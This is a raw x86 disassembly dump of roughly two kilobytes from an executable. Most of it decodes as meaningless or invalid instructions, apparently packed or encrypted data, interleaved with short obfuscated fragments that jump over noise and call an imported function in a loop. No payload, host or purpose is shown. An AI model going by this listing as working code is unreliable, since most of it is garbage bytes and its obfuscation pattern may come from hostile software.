  40990d:	les    ecx,FWORD PTR [ecx+ecx*8+0x40]
  409911:	and    al,0xe1
  409913:	sbb    BYTE PTR [esi+0x72],bl
  409916:	mov    dh,0x4a
  409918:	leave  
  409919:	fcom   DWORD PTR [edi-0x6c]
  40991c:	(bad)  
  40991d:	mov    DWORD PTR [esi-0x57fcc2ad],0x8ea00541
  409927:	out    0x69,al
  409929:	or     dl,BYTE PTR [edx+0x668400f6]
  40992f:	call   0xddb6:0xbe27c41a
  409936:	call   0xf0cd:0x7cfdc535
  40993d:	sub    bl,BYTE PTR [edi-0xd]
  409940:	fs daa 
  409942:	push   es
  409943:	repz cmp ecx,DWORD PTR [ebx-0x7c11a49e]
  40994a:	pcmpgtb mm3,mm2
  40994d:	jns    0x4098ea
  40994f:	inc    ebp
  409950:	retf   
  409951:	and    ebp,0xfffffff3
  409954:	adc    bl,bl
  409956:	rcr    DWORD PTR [eax+0x6f],1
  409959:	test   BYTE PTR [edi-0x38d76603],bh
  40995f:	adc    DWORD PTR ds:0xe55f317f,ebp
  409965:	aam    0xd3
  409967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409968:	add    DWORD PTR [edi-0x5f],0xe1c57380
  40996f:	mov    al,cl
  409971:	scas   al,BYTE PTR es:[edi]
  409972:	imul   edi,DWORD PTR [edx-0x2bd19f6e],0x56
  409979:	mov    ecx,0x3854af9d
  40997e:	inc    edx
  40997f:	sbb    BYTE PTR [eax-0x42],bh
  409982:	outs   dx,DWORD PTR ds:[esi]
  409983:	popa   
  409984:	sub    bl,BYTE PTR [eax]
  409986:	pushf  
  409987:	and    ebp,eax
  409989:	retf   0xca75
  40998c:	outs   dx,DWORD PTR ds:[esi]
  40998d:	push   eax
  40998e:	adc    ebx,ebp
  409990:	mov    al,ds:0x1fc599c7
  409995:	les    esi,FWORD PTR [ebx+0x41]
  409998:	pop    esp
  409999:	int    0x7f
  40999b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40999c:	lock out 0x66,al
  40999f:	fs cld 
  4099a1:	jp     0x40999e
  4099a3:	mov    bl,0x5b
  4099a5:	mov    cl,0x6f
  4099a7:	xchg   ebp,eax
  4099a8:	pop    ss
  4099a9:	cld    
  4099aa:	aas    
  4099ab:	push   eax
  4099ac:	sub    eax,DWORD PTR [ecx+ebp*4+0x1e1d8372]
  4099b3:	jmp    0xd1d77972
  4099b8:	jp     0x409a20
  4099ba:	inc    esi
  4099bb:	inc    edi
  4099bc:	leave  
  4099bd:	jns    0x409a2e
  4099bf:	repz jns 0x409a2e
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fe8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e21c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e397
  4099eb:	mov    edi,DWORD PTR ds:0x42e3a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e89c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e224,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fdf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e21c
  409a3d:	sbb    DWORD PTR ds:0x42e7eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	imul   DWORD PTR [ecx-0x7826287b]
  409a5e:	in     al,dx
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a02
  409a66:	pop    ecx
  409a67:	mov    ds:0x30f09988,al
  409a6c:	inc    edi
  409a6d:	push   ss
  409a6e:	xor    DWORD PTR es:[ebx],ecx
  409a71:	push   eax
  409a72:	jl     0x4099ff
  409a74:	ds push es
  409a76:	mov    dl,0xc5
  409a78:	push   ecx
  409a79:	test   ebx,edx
  409a7b:	ja     0x409a45
  409a7d:	adc    esi,DWORD PTR [eax]
  409a7f:	add    eax,0xdbc9474
  409a84:	cmp    dl,BYTE PTR [ecx+eax*8+0x17407409]
  409a8b:	pop    ebp
  409a8c:	adc    eax,0x46ae2ab3
  409a91:	loope  0x409a60
  409a93:	cmp    cl,al
  409a95:	sub    eax,0xdbf9c416
  409a9a:	loop   0x409a64
  409a9c:	adc    ebx,DWORD PTR [edx+0x40ec2d11]
  409aa2:	mov    bl,0x6d
  409aa4:	lods   al,BYTE PTR ds:[esi]
  409aa5:	data16 jo 0x409a44
  409aa8:	ret    0x9b48
  409aab:	pusha  
  409aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aad:	test   DWORD PTR [esi-0x57],esi
  409ab0:	sbb    BYTE PTR [edi+0x239b1175],0x38
  409ab7:	and    ah,0x9b
  409aba:	aam    0x15
  409abc:	outs   dx,DWORD PTR ds:[esi]
  409abd:	push   ds
  409abe:	sub    eax,0xf32e89ea
  409ac3:	ror    BYTE PTR [esi+0x34eea1a5],0x2b
  409aca:	clc    
  409acb:	sbb    BYTE PTR [esi],bh
  409acd:	fst    QWORD PTR ss:[eax]
  409ad0:	imul   esi,DWORD PTR [edx+edi*2],0xbee43b59
  409ad7:	sbb    BYTE PTR [edx],dl
  409ad9:	pushf  
  409ada:	cli    
  409adb:	push   ecx
  409adc:	ror    ebx,0xee
  409adf:	sbb    al,BYTE PTR [edx+0x54e7c6e6]
  409ae5:	mov    ds,WORD PTR [edi-0x20fefacd]
  409aeb:	ins    DWORD PTR es:[edi],dx
  409aec:	jne    0x409ac1
  409aee:	arpl   di,dx
  409af0:	dec    ebx
  409af1:	cmc    
  409af2:	xchg   BYTE PTR [ebp-0x7c9101f4],dh
  409af8:	push   eax
  409af9:	stos   DWORD PTR es:[edi],eax
  409afa:	jbe    0x409a94
  409afc:	(bad)  
  409afd:	mov    DWORD PTR [edi-0x23b62c2],edi
  409b03:	xchg   ecx,eax
  409b04:	or     esp,ebx
  409b06:	mov    ah,0xa2
  409b08:	loopne 0x409b05
  409b0a:	adc    cl,al
  409b0c:	iret   
  409b0d:	pop    esp
  409b0e:	mov    bh,0x18
  409b10:	imul   esi,DWORD PTR [esp+ebx*4-0x69],0x8f891ac2
  409b18:	and    DWORD PTR [edi+ecx*2+0x3a0cf509],esi
  409b1f:	xchg   esi,eax
  409b20:	xchg   edi,eax
  409b21:	iret   
  409b22:	in     eax,0xaa
  409b24:	addr16 out dx,al
  409b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b27:	rcl    BYTE PTR [edi],cl
  409b29:	fwait
  409b2a:	or     ah,dl
  409b2c:	or     eax,0xa44d2e04
  409b31:	bound  esi,QWORD PTR [ebx+ebp*4+0x635a0da0]
  409b38:	pop    ebp
  409b39:	mov    al,BYTE PTR [eax-0x7671f832]
  409b3f:	test   eax,0x426503b9
  409b44:	or     dl,BYTE PTR [esi-0x46]
  409b47:	pop    eax
  409b48:	add    al,0xa5
  409b4a:	mov    WORD PTR [esi-0x399a7d5d],?
  409b50:	mov    ch,0x47
  409b52:	outs   dx,DWORD PTR ds:[esi]
  409b53:	cmp    al,0x6b
  409b55:	sbb    ch,BYTE PTR [eax+0x25]
  409b58:	dec    edx
  409b59:	cmp    ebp,DWORD PTR [eax]
  409b5b:	pop    edx
  409b5c:	pop    ecx
  409b5d:	add    DWORD PTR [ecx-0x10],0xffffff80
  409b61:	mov    al,0x4d
  409b63:	pop    edi
  409b64:	lock mov bl,0x57
  409b67:	pusha  
  409b68:	pop    ebx
  409b69:	cld    
  409b6a:	push   ecx
  409b6b:	je     0x409b71
  409b6d:	repnz or ah,ch
  409b70:	inc    edi
  409b71:	sbb    ebx,DWORD PTR [edi-0x6c]
  409b74:	fstp   QWORD PTR [edx+0x7f372ed4]
  409b7a:	mov    bh,0x1b
  409b7c:	sub    eax,0xf09c7709
  409b81:	mov    ebx,DWORD PTR [ebp+0x33]
  409b84:	lods   al,BYTE PTR ds:[esi]
  409b85:	int3   
  409b86:	add    DWORD PTR [esi-0x8],edi
  409b89:	ret    0x9d89
  409b8c:	pop    ss
  409b8d:	add    ah,BYTE PTR fs:[edx-0x447ada5a]
  409b94:	inc    esi
  409b95:	xor    al,0x6e
  409b97:	sar    DWORD PTR [ebx+eax*8-0x5e],cl
  409b9b:	sti    
  409b9c:	adc    BYTE PTR [eax-0x19],dl
  409b9f:	jns    0x409b6c
  409ba1:	and    bh,BYTE PTR [ecx]
  409ba3:	and    eax,0xebfcfa46
  409ba8:	jg     0x409b31
  409baa:	fcomp  QWORD PTR [ebp-0x27a67627]
  409bb0:	push   ebp
  409bb1:	dec    esp
  409bb2:	cmp    ebx,DWORD PTR [edi]
  409bb4:	out    dx,al
  409bb5:	pop    eax
  409bb6:	pop    edx
  409bb7:	in     al,dx
  409bb8:	sbb    BYTE PTR [ecx],bl
  409bba:	sti    
  409bbb:	pop    ds
  409bbc:	add    esp,DWORD PTR [ebx]
  409bbe:	add    BYTE PTR [eax-0x35611f13],al
  409bc4:	loopne 0x409c42
  409bc6:	fild   DWORD PTR [edx-0x3745bff7]
  409bcc:	mov    eax,0xcf8fd32a
  409bd1:	dec    esi
  409bd2:	jg     0x409be2
  409bd4:	or     al,0xd8
  409bd6:	aaa    
  409bd7:	pop    esp
  409bd8:	aam    0xa2
  409bda:	div    ah
  409bdc:	cmove  ecx,DWORD PTR [ecx-0x4]
  409be0:	bound  edi,QWORD PTR [eax]
  409be2:	dec    eax
  409be3:	push   edx
  409be4:	out    0xa9,eax
  409be6:	or     dh,bh
  409be8:	jb     0x409b6a
  409bea:	ins    BYTE PTR es:[edi],dx
  409beb:	sti    
  409bec:	mov    edi,0x1264a329
  409bf1:	stos   BYTE PTR es:[edi],al
  409bf2:	push   0x10deb526
  409bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bf8:	cwde   
  409bf9:	ficom  DWORD PTR [edx-0x15]
  409bfc:	retf   0x1680
  409bff:	pop    ds
  409c00:	mov    eax,DWORD PTR [edx]
  409c02:	add    eax,0xe2d03ce8
  409c07:	ds mov dh,0x2f
  409c0a:	dec    esp
  409c0b:	jb     0x409bbc
  409c0d:	out    0x6c,al
  409c0f:	and    al,0xbe
  409c11:	lock pop ebp
  409c13:	call   0xed4c:0xbd0204a5
  409c1a:	cmp    edi,ecx
  409c1c:	add    esp,esi
  409c1e:	add    edi,DWORD PTR [esi-0xa]
  409c21:	adc    DWORD PTR fs:[ecx-0x4ff220ed],eax
  409c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c29:	(bad)  
  409c2a:	cli    
  409c2b:	mov    eax,ds:0x888a6a
  409c30:	lock (bad) [edx]
  409c33:	push   edi
  409c34:	push   0x8bb80ae2
  409c39:	mov    eax,0x1e2e0e19
  409c3e:	aam    0x87
  409c40:	jbe    0x409c30
  409c42:	in     al,0xe3
  409c44:	xchg   ebp,eax
  409c45:	adc    ecx,DWORD PTR [edi-0xd]
  409c48:	popa   
  409c49:	(bad)  
  409c4a:	jmp    0x409bd5
  409c4c:	jnp    0x409c54
  409c4e:	dec    ebx
  409c4f:	or     ah,BYTE PTR [ecx+eax*1+0x1a2b0115]
  409c56:	or     DWORD PTR [ebx-0x181ea3f2],0x32
  409c5d:	mov    al,0xb0
  409c5f:	cmp    DWORD PTR [eax],0x8827999c
  409c65:	adc    dl,BYTE PTR ds:0x73ea75b5
  409c6b:	xchg   esi,eax
  409c6c:	push   edi
  409c6d:	push   0x4d1923fc
  409c72:	inc    ecx
  409c73:	mov    ebp,0x2c7af744
  409c78:	out    0x31,eax
  409c7a:	or     bh,BYTE PTR [bx+di-0x34]
  409c7e:	scas   eax,DWORD PTR es:[edi]
  409c7f:	mov    ecx,0x6edf6de
  409c84:	lods   al,BYTE PTR ds:[esi]
  409c85:	jns    0x409c3c
  409c87:	int    0x84
  409c89:	mov    ds:0x2782f111,al
  409c8e:	cmp    al,0x89
  409c90:	imul   esp,DWORD PTR [ebp-0x55],0xffffffe6
  409c94:	jnp    0x409c34
  409c96:	or     eax,0x9180d8fd
  409c9b:	jno    0x409d0e
  409c9d:	sub    BYTE PTR [esp+eax*4+0x1b],ch
  409ca1:	jmp    0xb870:0x291612ff
  409ca8:	jnp    0x409d27
  409caa:	test   edi,esp
  409cac:	out    dx,eax
  409cad:	call   0x7495b20
  409cb2:	sar    ah,0xd9
  409cb5:	retf   
  409cb6:	xchg   ebx,eax
  409cb7:	jnp    0x409d09
  409cb9:	and    eax,0x3611f833
  409cbe:	pop    esp
  409cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cc0:	fwait
  409cc1:	out    dx,eax
  409cc2:	mov    bh,0xd5
  409cc4:	mov    al,0xc5
  409cc6:	fucom  st(3)
  409cc8:	cmp    eax,0xde0ce7ab
  409ccd:	mov    dl,0x8c
  409ccf:	fmul   st,st(0)
  409cd1:	adc    BYTE PTR [edi],ch
  409cd3:	inc    ebp
  409cd4:	cs add al,0x6b
  409cd7:	in     al,dx
  409cd8:	push   edx
  409cd9:	ret    0x7563
  409cdc:	adc    DWORD PTR [edx],0xb591215f
  409ce2:	mov    ecx,esp
  409ce4:	xchg   ecx,eax
  409ce5:	and    DWORD PTR [esi+0x33],esp
  409ce8:	push   eax
  409ce9:	push   es
  409cea:	mov    ch,0xd2
  409cec:	cmp    BYTE PTR [ebx-0x19],bh
  409cef:	fst    DWORD PTR [ebx-0x17]
  409cf2:	pop    ds
  409cf3:	mov    al,ds:0x3af9941e
  409cf8:	sahf   
  409cf9:	pushf  
  409cfa:	sbb    al,0x3e
  409cfc:	ss and eax,0xfffffff2
  409d00:	inc    esi
  409d01:	jbe    0x409ced
  409d03:	fcomp  DWORD PTR [ebp-0x2e45879e]
  409d09:	push   ebx
  409d0a:	mov    bl,0xb3
  409d0c:	pop    eax
  409d0d:	and    al,0xc1
  409d0f:	xor    bh,BYTE PTR [edi-0x4fed31cf]
  409d15:	out    dx,al
  409d16:	add    BYTE PTR [ebp+ebp*2+0x70d3fb0f],ch
  409d1d:	iret   
  409d1e:	stc    
  409d1f:	jecxz  0x409d10
  409d21:	pop    esp
  409d22:	inc    edi
  409d23:	inc    edi
  409d24:	cmp    ecx,DWORD PTR [eax-0x59]
  409d27:	imul   esp,ebx,0x67f2e3ee
  409d2d:	pop    eax
  409d2e:	dec    edx
  409d2f:	xchg   ebp,eax
  409d30:	pop    ebp
  409d31:	je     0x409d55
  409d33:	mov    ebp,0x216a2e7d
  409d38:	dec    esp
  409d39:	inc    DWORD PTR [edx]
  409d3b:	push   0x59
  409d3d:	lods   al,BYTE PTR ds:[esi]
  409d3e:	cmp    BYTE PTR [edi+0x4c612c71],ch
  409d44:	pop    ebx
  409d45:	mov    al,ds:0x469fe680
  409d4a:	(bad)  
  409d4c:	ret    
  409d4d:	inc    edx
  409d4e:	and    bl,dl
  409d50:	cdq    
  409d51:	inc    ebx
  409d52:	or     BYTE PTR [ebp+ebx*2+0xf8ebf92],dl
  409d59:	mov    al,ds:0xa128264d
  409d5e:	(bad)  
  409d5f:	adc    DWORD PTR [esp+eiz*8-0x7e7802d7],eax
  409d66:	adc    al,0x54
  409d68:	icebp  
  409d69:	in     al,0xf0
  409d6b:	hlt    
  409d6c:	mov    ecx,0xea3fd147
  409d71:	pop    ebp
  409d72:	jmp    0x4e8bf061
  409d77:	dec    esi
  409d78:	div    BYTE PTR [edi+0x75676963]
  409d7e:	pop    edx
  409d7f:	inc    esp
  409d80:	cwde   
  409d81:	sahf   
  409d82:	mov    ebp,0x10885383
  409d87:	hlt    
  409d88:	adc    al,0xda
  409d8a:	stos   BYTE PTR es:[edi],al
  409d8b:	popa   
  409d8c:	mov    ecx,0x704eb83b
  409d91:	out    0x94,al
  409d93:	leave  
  409d94:	push   edx
  409d95:	data16 jp 0x409dac
  409d98:	retf   
  409d99:	mov    DWORD PTR [esi+0x13],eax
  409d9c:	cmp    BYTE PTR [edi+0x3],0xcb
  409da0:	or     eax,0xe7bdea21
  409da5:	jmp    0xe55d987e
  409daa:	sbb    DWORD PTR [ebp+0x762cd56e],edi
  409db0:	retf   
  409db1:	out    dx,al
  409db2:	adc    eax,0x34b7ce40
  409db7:	dec    ebp
  409db8:	sbb    ah,BYTE PTR [edx+0x5525e69c]
  409dbe:	loopne 0x409dfe
  409dc0:	add    BYTE PTR ds:0xa06d4823,dl
  409dc6:	stos   BYTE PTR es:[edi],al
  409dc7:	mov    ebx,DWORD PTR [edi]
  409dc9:	in     al,dx
  409dca:	test   eax,0x902813a6
  409dcf:	loop   0x409dd9
  409dd1:	mov    ah,0xee
  409dd3:	push   0xc5a7c051
  409dd8:	mov    dh,0x38
  409dda:	sar    eax,0x81
  409ddd:	gs scas al,BYTE PTR es:[edi]
  409ddf:	aad    0x43
  409de1:	fadd   DWORD PTR [edx+0x30cfa006]
  409de7:	jl     0x409d85
  409de9:	shl    BYTE PTR [eax+0x52fae41e],0xdd
  409df0:	cld    
  409df1:	and    edx,DWORD PTR [esi-0x13]
  409df4:	fst    QWORD PTR [ebp+0x47cd2329]
  409dfa:	jmp    0x5e980e1e
  409dff:	add    ebp,DWORD PTR [eax-0x2e]
  409e02:	pop    edi
  409e03:	add    edi,esi
  409e05:	inc    ecx
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fe8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fdf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e224
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fe82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fe82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fe82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e3e3
  409e51:	mov    edi,DWORD PTR ds:0x42fe82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fe82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e803,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	sbb    BYTE PTR [ebp-0x17d98f1d],dl
  409e87:	jo     0x409ef9
  409e89:	lahf   
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409ea3
  409e8e:	ins    BYTE PTR es:[edi],dx
  409e8f:	or     ah,BYTE PTR [ebp-0x4]
  409e92:	mov    eax,ds:0x9c132355
  409e97:	dec    ecx
  409e98:	fnstenv [edx-0x45a94bf2]
  409e9e:	neg    BYTE PTR [eax+0xf]
  409ea1:	pop    ds
  409ea2:	out    0x6b,al
  409ea4:	cli    
  409ea5:	pop    ss
  409ea6:	das    
  409ea7:	mov    bl,0xd0
  409ea9:	inc    eax
  409eab:	sub    esi,DWORD PTR [ecx]
  409ead:	dec    edi
  409eae:	hlt    
  409eaf:	add    DWORD PTR [esi],eax
  409eb1:	ins    BYTE PTR es:[edi],dx
  409eb2:	dec    edx
  409eb3:	(bad)  
  409eb4:	iret   
  409eb5:	and    esi,edx
  409eb7:	jbe    0x409ece
  409eb9:	jp     0x409f10
  409ebb:	rcr    bh,1
  409ebd:	in     eax,dx
  409ebe:	cmp    ebp,ecx
  409ec0:	add    dl,BYTE PTR [ecx]
  409ec2:	ins    DWORD PTR es:[edi],dx
  409ec3:	jmp    0x177a7fdf
  409ec8:	arpl   WORD PTR [ebx+eiz*8],si
  409ecb:	and    DWORD PTR [ebx],ecx
  409ecd:	mov    eax,ds:0x7ad9f9e8
  409ed2:	loopne 0x409e84
  409ed4:	add    al,0xb6
  409ed6:	adc    al,0xcc
  409ed8:	lock and DWORD PTR [edi],edx
  409edb:	mov    eax,ss
  409edd:	cs dec ebp
  409edf:	or     ebx,DWORD PTR [eax-0x119c242f]
  409ee5:	(bad)  
  409ee6:	icebp  
  409ee7:	repnz xor eax,DWORD PTR [edx-0x25]
  409eeb:	push   ecx
  409eec:	adc    eax,0x2c12aa0f
  409ef1:	jecxz  0x409f1f
  409ef3:	fistp  DWORD PTR fs:[edi-0x7697e002]
  409efa:	dec    eax
  409efb:	jg     0x409ef4
  409efd:	add    DWORD PTR [edx-0x60d2200],esi
  409f03:	pop    edi
  409f04:	sbb    ch,bl
  409f06:	repnz xchg esp,eax
  409f08:	dec    eax
  409f09:	push   ss
  409f0a:	cdq    
  409f0b:	xor    al,0xb4
  409f0d:	xchg   dl,bl
  409f0f:	add    BYTE PTR [edi],bh
  409f11:	xchg   DWORD PTR [edx],ecx
  409f13:	pop    eax
  409f14:	fs in  al,0x7
  409f17:	test   BYTE PTR [edx+0x29],dh
  409f1a:	(bad)  
  409f1b:	lea    ecx,[esi]
  409f1d:	dec    esi
  409f1e:	repnz aam 0xdf
  409f21:	sub    edi,DWORD PTR [esi-0x2016a0ab]
  409f27:	jne    0x409f52
  409f29:	add    eax,0x1e3f4314
  409f2e:	xchg   ebx,edi
  409f30:	lea    esp,[esi+0x52]
  409f33:	sbb    esi,DWORD PTR [edx]
  409f35:	stos   DWORD PTR es:[edi],eax
  409f36:	adc    bh,BYTE PTR [esi+0x436deee]
  409f3c:	xchg   ecx,eax
  409f3d:	mov    BYTE PTR [edx+0x23899aa3],0x36
  409f44:	or     ch,BYTE PTR [eax+ebx*1+0x15]
  409f48:	pop    ebp
  409f49:	sub    al,0x83
  409f4b:	idiv   DWORD PTR [esi-0x42]
  409f4e:	jmp    FWORD PTR [eax]
  409f50:	fdivr  QWORD PTR [esi-0x39fd8665]
  409f56:	sub    BYTE PTR [eax],bh
  409f58:	stos   BYTE PTR es:[edi],al
  409f59:	pop    edi
  409f5a:	arpl   di,dx
  409f5c:	mov    dh,0xa6
  409f5e:	(bad)
  409f62:	sub    DWORD PTR [ebp+0x32ddf1d9],ebp
  409f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f69:	xor    DWORD PTR [ecx+esi*1],ebx
  409f6c:	rcl    DWORD PTR [ebx],cl
  409f6e:	add    al,0x39
  409f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f71:	shl    DWORD PTR [edi],cl
  409f73:	out    dx,al
  409f74:	shl    eax,1
  409f76:	xlat   BYTE PTR ds:[ebx]
  409f77:	mov    WORD PTR [esi-0x3fbf89b0],ds
  409f7d:	(bad)  [ecx-0x252b3497]
  409f83:	sbb    DWORD PTR [edx-0x69],esp
  409f86:	imul   ebp,DWORD PTR [esp+eax*8+0x6dedf1cc],0x30dfe51b
  409f91:	adc    ebx,edi
  409f93:	pop    ecx
  409f94:	ins    BYTE PTR es:[edi],dx
  409f95:	push   ebx
  409f96:	sub    BYTE PTR [esi-0x37ac9c11],cl
  409f9c:	(bad)  
  409f9d:	aas    
  409f9e:	dec    edx
  409f9f:	das    
  409fa0:	mov    ecx,0x9119290a
  409fa5:	inc    esp
  409fa6:	out    0x1c,eax
  409fa8:	and    edi,edx
  409faa:	ret    0x7aaa
  409fad:	scas   eax,DWORD PTR es:[edi]
  409fae:	adc    ebx,eax
  409fb0:	repz cmp bh,BYTE PTR [ebp+0x45]
  409fb4:	in     al,0xfa
  409fb6:	pop    ecx
  409fb7:	mov    ah,0x31
  409fb9:	enter  0xa641,0x9e
  409fbd:	jge    0x40a034
  409fbf:	add    DWORD PTR [edi],0x55
  409fc2:	push   es
  409fc3:	xor    ebp,ebp
  409fc5:	push   ss
  409fc6:	in     al,dx
  409fc7:	(bad)  
  409fc8:	jo     0x40a044
  409fca:	mov    ds:0x69bf4d21,eax
  409fcf:	aaa    
  409fd0:	jecxz  0x409fdf
  409fd2:	mov    WORD PTR [ecx],?
  409fd4:	or     DWORD PTR [esi+0x6d52ffe8],edi
  409fda:	and    al,0x8b
  409fdc:	add    al,0x20
  409fde:	mov    dl,0xd0
  409fe0:	xor    al,BYTE PTR [edx-0x6c]
  409fe3:	sub    dh,cl
  409fe5:	or     al,0x88
  409fe8:	xor    al,0xa4
  409fea:	retf   
  409feb:	sub    al,0x3d
  409fed:	dec    esp
  409fee:	and    eax,DWORD PTR [esi]
  409ff0:	or     al,BYTE PTR [ebp+ecx*2-0x75]
  409ff4:	push   edx
  409ff5:	xchg   BYTE PTR [ebx-0xe3a0767],ch
  409ffb:	shl    bl,1
  409ffd:	lds    ecx,FWORD PTR [eax+0x5a13c2fc]
  40a003:	sbb    eax,0x3c93662b
  40a008:	lock xor DWORD PTR [edx+0x6898ea8],esp
  40a00f:	or     al,0xfb
  40a011:	jne    0x409fbc
  40a013:	mov    ch,0x53
  40a015:	in     al,dx
  40a016:	mov    ebp,0x70b124f1
  40a01b:	add    esp,DWORD PTR [esi-0x793646bd]
  40a021:	mov    ch,BYTE PTR [ecx]
  40a023:	push   eax
  40a024:	push   0xffffffd5
  40a026:	outs   dx,DWORD PTR ds:[esi]
  40a027:	pop    ebp
  40a028:	pusha  
  40a029:	jecxz  0x40a01f
  40a02b:	pop    edx
  40a02c:	sahf   
  40a02d:	jo     0x409fb7
  40a02f:	push   edx
  40a030:	aam    0x42
  40a032:	and    DWORD PTR [esi],edx
  40a034:	adc    ebp,DWORD PTR [ecx]
  40a036:	call   0xde43d0ee
  40a03b:	push   esp
  40a03c:	mov    ebx,eax
  40a03e:	pop    ss
  40a03f:	sahf   
  40a040:	das    
  40a041:	xor    ebp,esp
  40a043:	outs   dx,BYTE PTR ds:[esi]
  40a044:	fcomp  QWORD PTR [ecx]
  40a046:	jbe    0x409fdb
  40a048:	or     ah,BYTE PTR [edx]
  40a04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a04b:	xor    al,0x3a
  40a04d:	(bad)  
  40a04e:	gs jnp 0x40a08f
  40a051:	repnz mov bl,0xf3
  40a054:	and    al,0x90
  40a056:	or     esi,DWORD PTR [edi+0x8]
  40a059:	jno    0x40a0b4
  40a05b:	or     eax,0x20f2c12c
  40a060:	clc    
  40a061:	sti    
  40a062:	pop    ds
  40a063:	shl    ebp,1
  40a065:	sbb    cl,dl
  40a067:	sub    eax,0x7ce44c2d
  40a06c:	in     al,dx
  40a06d:	xchg   edi,eax
  40a06e:	pop    ecx
  40a06f:	(bad)  
  40a070:	idiv   DWORD PTR [ebx-0x4158518c]
  40a076:	ficomp WORD PTR [edi]
  40a078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a079:	pop    eax
  40a07a:	out    0x41,al
  40a07c:	xchg   edx,eax
  40a07d:	ja     0x40a02f
  40a07f:	push   ecx
  40a080:	or     BYTE PTR [ebp+eax*8-0x18],cl
  40a084:	jecxz  0x40a00c
  40a086:	mov    cl,0x67
  40a088:	fsubp  st(6),st
  40a08a:	xchg   DWORD PTR [ebp+0xa7050e6],edx
  40a090:	inc    ecx
  40a091:	lds    esi,FWORD PTR [edi+0x1ffddc8b]
  40a097:	fdiv   st,st(1)
  40a099:	ins    BYTE PTR es:[edi],dx
  40a09a:	and    DWORD PTR [eax+0x75],esp
  40a09d:	iret   
  40a09e:	xor    al,0xad
  40a0a0:	or     DWORD PTR [ebx+ebx*2],eax
  40a0a3:	lahf   
  40a0a4:	mov    al,ds:0x23a2effc
  40a0a9:	fwait
  40a0aa:	mov    bh,0xaa
  40a0ac:	or     esi,DWORD PTR [edi+0x75]
  40a0af:	xchg   ebp,eax
  40a0b0:	iret   
  40a0b1:	(bad)  
  40a0b2:	adc    eax,0xe767b6e7
  40a0b7:	dec    ecx
  40a0b8:	inc    esi
  40a0b9:	test   BYTE PTR [edx],dl
  40a0bb:	dec    esi
  40a0bc:	rol    edi,0xde
  40a0bf:	xlat   BYTE PTR ds:[ebx]
  40a0c0:	adc    esp,DWORD PTR [edi+edx*2-0x6e]
  40a0c4:	jle    0x40a04b
  40a0c6:	ins    BYTE PTR es:[edi],dx
  40a0c7:	sar    BYTE PTR [ebx+0x57],1
  40a0ca:	adc    al,0xa4
  40a0cc:	add    edi,DWORD PTR [edx]
  40a0ce:	icebp  
  40a0cf:	add    al,0x5e
  40a0d1:	jecxz  0x40a10f
  40a0d3:	scas   eax,DWORD PTR es:[edi]
  40a0d4:	lock (bad) 
  40a0d6:	xchg   esp,eax
  40a0d7:	(bad)  
  40a0d8:	cmc    
  40a0d9:	out    dx,eax
  40a0da:	xor    eax,0x7eca4d7c
  40a0df:	aas    
  40a0e0:	xchg   ebx,eax
